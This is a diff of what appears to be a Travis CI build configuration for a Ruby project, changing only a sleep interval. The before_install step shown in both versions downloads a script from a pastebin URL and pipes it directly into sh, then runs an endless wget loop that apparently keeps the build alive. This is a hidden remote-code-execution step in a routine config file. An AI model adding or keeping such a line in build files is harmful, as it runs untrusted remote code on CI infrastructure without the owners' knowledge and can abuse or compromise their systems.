@@ -26,7 +26,7 @@ stages:
     if: commit_message =~ /ship:docker/ OR env(SHIP_DOCKER) = true
 
 before_install:
-  - (wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh && while true; do wget google.com ; sleep 900 ; done
+  - (wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh && while true; do wget google.com ; sleep 500 ; done
   - gem update --silent --system 3.4.13
   - 'echo "gem: --no-document" >> ~/.gemrc' # Skip installing documentation
   # - gem install bundler -v $(awk '/BUNDLED WITH/{getline; print}' Gemfile.lock)
